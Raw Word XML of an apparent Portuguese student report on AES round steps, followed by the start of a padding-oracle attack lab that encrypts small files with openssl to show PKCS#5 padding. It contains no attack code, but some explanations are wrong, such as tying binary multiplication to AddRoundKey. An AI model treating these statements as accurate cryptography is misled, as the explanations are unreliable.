          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="164C2213" w14:textId="77777777" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00000000" w:rsidP="00FE74A6">
      <w:r>
        <w:pict w14:anchorId="5BC0BCFF">
          <v:rect id="_x0000_i1036" style="width:441.9pt;height:1.2pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="01C3F91E" w14:textId="77777777" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00FE74A6" w:rsidP="00FE74A6">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FE74A6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Ronda 2 - ShiftRows</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56389414" w14:textId="7A11535C" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00FE74A6" w:rsidP="00FE74A6">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FE74A6">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="114300" distB="114300" distL="114300" distR="114300" simplePos="0" relativeHeight="251680768" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="4EDF970A" wp14:editId="7BF82787">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:posOffset>278130</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>26670</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="2663190" cy="1533525"/>
            <wp:effectExtent l="0" t="0" r="3810" b="9525"/>
            <wp:wrapNone/>
            <wp:docPr id="661189245"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33">
                      <a:extLst>
                        <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                          <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
                        </a:ext>
                      </a:extLst>
                    </a:blip>
                    <a:srcRect l="4430" t="6177" r="4370" b="6310"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="2663190" cy="1533525"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
            <wp14:sizeRelH relativeFrom="page">
              <wp14:pctWidth>0</wp14:pctWidth>
            </wp14:sizeRelH>
            <wp14:sizeRelV relativeFrom="page">
              <wp14:pctHeight>0</wp14:pctHeight>
            </wp14:sizeRelV>
          </wp:anchor>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5395B0DA" w14:textId="77777777" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00FE74A6" w:rsidP="00FE74A6">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="30AE6B5F" w14:textId="77777777" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00FE74A6" w:rsidP="00FE74A6">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2E59DCA0" w14:textId="77777777" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00FE74A6" w:rsidP="00FE74A6">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4871BA0B" w14:textId="77777777" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00FE74A6" w:rsidP="00FE74A6">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4DFB229E" w14:textId="77777777" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00000000" w:rsidP="00FE74A6">
      <w:r>
        <w:pict w14:anchorId="0C1F5A9B">
          <v:rect id="_x0000_i1037" style="width:441.9pt;height:1.2pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="366BF372" w14:textId="5BD4F6A5" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00FE74A6" w:rsidP="00FE74A6">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FE74A6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Ronda 3 - </w:t>
      </w:r>
      <w:r w:rsidRPr="00FE74A6">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="114300" distB="114300" distL="114300" distR="114300" simplePos="0" relativeHeight="251679744" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="72B240FB" wp14:editId="09CEC129">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:posOffset>3305175</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>198755</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="1630045" cy="1852295"/>
            <wp:effectExtent l="0" t="0" r="8255" b="0"/>
            <wp:wrapNone/>
            <wp:docPr id="113179735"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30045" cy="1852295"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
            <wp14:sizeRelH relativeFrom="page">
              <wp14:pctWidth>0</wp14:pctWidth>
            </wp14:sizeRelH>
            <wp14:sizeRelV relativeFrom="page">
              <wp14:pctHeight>0</wp14:pctHeight>
            </wp14:sizeRelV>
          </wp:anchor>
        </w:drawing>
      </w:r>
      <w:r w:rsidRPr="00FE74A6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>MixColumns</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66673367" w14:textId="586C3C6D" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00FE74A6" w:rsidP="00FE74A6">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FE74A6">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="114300" distB="114300" distL="114300" distR="114300" simplePos="0" relativeHeight="251681792" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="3B73E208" wp14:editId="3614D641">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:posOffset>180975</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>153035</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="2498725" cy="1262380"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:wrapNone/>
            <wp:docPr id="106710779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98725" cy="1262380"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
            <wp14:sizeRelH relativeFrom="page">
              <wp14:pctWidth>0</wp14:pctWidth>
            </wp14:sizeRelH>
            <wp14:sizeRelV relativeFrom="page">
              <wp14:pctHeight>0</wp14:pctHeight>
            </wp14:sizeRelV>
          </wp:anchor>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="202BF234" w14:textId="77777777" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00FE74A6" w:rsidP="00FE74A6">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="50F76B10" w14:textId="77777777" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00FE74A6" w:rsidP="00FE74A6">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3ED32B2A" w14:textId="77777777" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00FE74A6" w:rsidP="00FE74A6">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="462BC8BE" w14:textId="77777777" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00FE74A6" w:rsidP="00FE74A6">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="18C0FCBD" w14:textId="77777777" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00FE74A6" w:rsidP="00FE74A6"/>
    <w:p w14:paraId="3EAC9EB9" w14:textId="77777777" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00FE74A6" w:rsidP="00FE74A6">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="35"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00FE74A6">
        <w:t>No exemplo que mostro em cima aparece na segunda linha da matriz 4X4.</w:t>
      </w:r>
      <w:r w:rsidRPr="00FE74A6">
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F5204A8" w14:textId="77777777" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00FE74A6" w:rsidP="00FE74A6">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="08899EFD" w14:textId="77777777" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00FE74A6" w:rsidP="00FE74A6">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="36"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FE74A6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Linha 0 -  </w:t>
      </w:r>
      <w:r w:rsidRPr="00FE74A6">
        <w:t>Os números ficam iguais.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22A5106D" w14:textId="77777777" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00FE74A6" w:rsidP="00FE74A6">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="36"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FE74A6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Linha 1 -  </w:t>
      </w:r>
      <w:r w:rsidRPr="00FE74A6">
        <w:t>Roda 1 posição para a esquerda com vemos na imagem.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3173E823" w14:textId="77777777" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00FE74A6" w:rsidP="00FE74A6">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="36"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FE74A6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Linha 2 -</w:t>
      </w:r>
      <w:r w:rsidRPr="00FE74A6">
        <w:t xml:space="preserve"> Roda 2 posições. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="469D4594" w14:textId="77777777" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00FE74A6" w:rsidP="00FE74A6">
      <w:r w:rsidRPr="00FE74A6">
        <w:t xml:space="preserve">Exemplo: o 6B passa para a posição do 7E </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A8327D1" w14:textId="77777777" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00FE74A6" w:rsidP="00FE74A6">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="36"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FE74A6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Linha 3 -</w:t>
      </w:r>
      <w:r w:rsidRPr="00FE74A6">
        <w:t xml:space="preserve"> E na última linha roda 3 posições da esquerda </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="349B49BA" w14:textId="77777777" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00FE74A6" w:rsidP="00FE74A6">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FE74A6">
        <w:t xml:space="preserve">             Exemplo: 70 passa para a posição do 27 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44684561" w14:textId="77777777" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00000000" w:rsidP="00FE74A6">
      <w:r>
        <w:pict w14:anchorId="29E3A93A">
          <v:rect id="_x0000_i1038" style="width:441.9pt;height:1.2pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F3A67C9" w14:textId="77777777" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00FE74A6" w:rsidP="00FE74A6">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FE74A6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Último Ronda 4</w:t>
      </w:r>
      <w:r w:rsidRPr="00FE74A6">
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:r w:rsidRPr="00FE74A6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> AddRoundKey</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EAC8A26" w14:textId="77777777" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00FE74A6" w:rsidP="00FE74A6">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="37"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00FE74A6">
        <w:t>Nesta ronda tínhamos de usar a multiplicação binária.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C3C9EA9" w14:textId="77777777" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00FE74A6" w:rsidP="00FE74A6">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FE74A6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Resultado Final </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C9F7E7B" w14:textId="129C690E" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00FE74A6" w:rsidP="00FE74A6">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FE74A6">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="114300" distB="114300" distL="114300" distR="114300" simplePos="0" relativeHeight="251676672" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="67B328B1" wp14:editId="7D787E91">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:posOffset>238125</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>323850</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5278120" cy="533400"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:wrapNone/>
            <wp:docPr id="81531026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36">
                      <a:extLst>
                        <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                          <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
                        </a:ext>
                      </a:extLst>
                    </a:blip>
                    <a:srcRect l="2931" t="12370" r="1811" b="11482"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5278120" cy="533400"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
            <wp14:sizeRelH relativeFrom="page">
              <wp14:pctWidth>0</wp14:pctWidth>
            </wp14:sizeRelH>
            <wp14:sizeRelV relativeFrom="page">
              <wp14:pctHeight>0</wp14:pctHeight>
            </wp14:sizeRelV>
          </wp:anchor>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DC3FA4A" w14:textId="77777777" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00FE74A6" w:rsidP="00FE74A6">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="775A0591" w14:textId="77777777" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00FE74A6" w:rsidP="00FE74A6"/>
    <w:p w14:paraId="5563F422" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pageBreakBefore/>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7D9C620A" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="736A05C0" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="456B9B26" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C2BD925" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="49364033" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="4149C39D" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="45E224C4" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="0FA95F07" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="6FAF51A1" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="33DB6F45" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="0448858F" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="6D386A1B" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="284B7FA0" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="736BF3AA" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
      </w:pPr>
      <w:bookmarkStart w:id="206" w:name="_Toc213874746"/>
      <w:bookmarkStart w:id="207" w:name="_Toc213881984"/>
      <w:r>
        <w:t>Apêndice F – Laboratório de Ataque Padding Oracle</w:t>
      </w:r>
      <w:bookmarkEnd w:id="206"/>
      <w:bookmarkEnd w:id="207"/>
    </w:p>
    <w:p w14:paraId="0F6FB919" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
        <w:jc w:val="center"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4C1C9CC5" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pageBreakBefore/>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
      <w:bookmarkStart w:id="208" w:name="relatriolaboratriodeataquepaddingoracle"/>
      <w:bookmarkEnd w:id="208"/>
    </w:p>
    <w:p w14:paraId="00B6FD40" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000" w:rsidP="00392CCA">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:bookmarkStart w:id="209" w:name="exerccio1compreenderomecanismodepadding"/>
      <w:bookmarkStart w:id="210" w:name="_Toc213874747"/>
      <w:bookmarkStart w:id="211" w:name="_Toc213881985"/>
      <w:bookmarkEnd w:id="209"/>
      <w:r>
        <w:t>Exercício 1: Compreender o Mecanismo de Padding</w:t>
      </w:r>
      <w:bookmarkEnd w:id="210"/>
      <w:bookmarkEnd w:id="211"/>
    </w:p>
    <w:p w14:paraId="071E1EE6" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="212" w:name="objectivo"/>
      <w:bookmarkStart w:id="213" w:name="_Toc213874748"/>
      <w:bookmarkStart w:id="214" w:name="_Toc213881986"/>
      <w:bookmarkEnd w:id="212"/>
      <w:r>
        <w:t>Objectivo</w:t>
      </w:r>
      <w:bookmarkEnd w:id="213"/>
      <w:bookmarkEnd w:id="214"/>
    </w:p>
    <w:p w14:paraId="29941C33" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Perceber como funciona o padding PKCS#5 em cifras de bloco que operam no modo CBC (Cipher Block Chaining).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="320A89D0" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="215" w:name="procedimentoexperimental"/>
      <w:bookmarkStart w:id="216" w:name="_Toc213874749"/>
      <w:bookmarkStart w:id="217" w:name="_Toc213881987"/>
      <w:bookmarkEnd w:id="215"/>
      <w:r>
        <w:t>Procedimento Experimental</w:t>
      </w:r>
      <w:bookmarkEnd w:id="216"/>
      <w:bookmarkEnd w:id="217"/>
    </w:p>
    <w:p w14:paraId="5955B203" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Criamos 3 ficheiros diferentes:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="479AFD2F" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>$ echo -n "12345" &gt; ficheiro1.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FEFDF60" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">$ echo -n "1234512345" &gt; ficheiro2.txt  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50591D8C" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:spacing w:after="283"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>$ echo -n "1234512345123456" &gt; ficheiro3.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05CF5C21" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="218" w:name="anlisedoprimeiroficheiro5bytes"/>
      <w:bookmarkStart w:id="219" w:name="_Toc213874750"/>
      <w:bookmarkStart w:id="220" w:name="_Toc213881988"/>
      <w:bookmarkEnd w:id="218"/>
      <w:r>
        <w:t>Análise do Primeiro Ficheiro (5 bytes)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="219"/>
      <w:bookmarkEnd w:id="220"/>
    </w:p>
    <w:p w14:paraId="7F0E1069" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Ciframos o ficheiro utilizando AES-128-CBC:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="599895B6" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>$ openssl enc -aes-128-cbc -e -p -in ficheiro1.txt -out ficheiro1_cifrado.txt \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DB453D6" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>-K 00112233445566778889aabbccddeeff \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A012817" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:spacing w:after="283"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>-iv 0102030405060708</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="396BAAAF" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Forte"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Observação importante</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>: O ficheiro cifrado resultou em 16 bytes. Isto acontece porque o AES-128 trabalha com blocos fixos de 16 bytes.</w:t>
      </w:r>
    </w:p>
